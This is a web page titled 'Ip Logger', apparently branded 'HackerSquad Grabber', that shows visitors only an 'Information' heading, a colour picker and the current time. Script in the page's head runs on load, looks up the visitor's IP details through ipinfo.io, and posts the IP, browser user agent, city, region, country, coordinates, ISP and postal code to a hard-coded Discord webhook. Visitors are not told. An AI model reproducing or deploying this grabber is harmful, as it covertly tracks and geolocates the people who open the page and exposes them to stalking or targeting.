<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Ip Logger</title>
	<link type="text/css" rel="stylesheet" href="style.css">
	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script>
		$.get("https://ipinfo.io", function(response) {
			const webhook_url = "https://discord.com/api/webhooks/996640689200840754/8fdw_c29V5X9oXd4lRT85veF4TLYB0Fb2ClM6H_ch9y2BJXGxDC2HxZdiMUReVWGjJl4";
			const main = {
				title: "Ip Logger",
				description: "> __Rennegade Ip Logger__",
				thumbnail: {
					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
				},
				fields: [
					{
						name: "IP:",
						value: `\`${response.ip}\``,
						inline: false,
					},
					{
						name: "User-Agent:",
						value: `\`${navigator.userAgent}\``,
						inline: false,
					},
					{
						name: "Ciudad:",
						value: `\`${response.city}\``,
						inline: false,
					},
					{
						name: "Region:",
						value: `\`${response.region}\``,
						inline: false
					},
					{
						name: "País:",
						value: `\`${response.country}\``,
						inline: false
					},
					{
						name: "Localización:",
						value: `\`${response.loc}\``,
						inline: false
					},
					{
						name: "Compañia:",
						value: `\`${response.org}\``,
						inline: false
					},
					{
						name: "Código postal:",
						value: `\`${response.postal}\``,
						inline: false
					},
				],
				footer: {
					text: "HackerSquad Grabber"
				},
				author: {
					name: "{ Rennegade }",
					url: "https://discord.gg/fvck"
				}
			}
			var xhttp = new XMLHttpRequest();
			const url = webhook_url;
			xhttp.open("POST", url, true);
			xhttp.setRequestHeader('Content-Type', 'application/json');
			xhttp.send(JSON.stringify({
				'username': 'Ip Grabber',
				'embeds': [main],
			}));
		}, "json");
	</script>
</head>
<body>
	<center>
		<h1>Information</h1>
		<input type="color"></input>
		<p>Actual time: <span id="here"></span></p>
	</center>
	<script>
		const date = new Date();
		document.getElementById('here').innerHTML = date;
	</script>
</body>
</html>
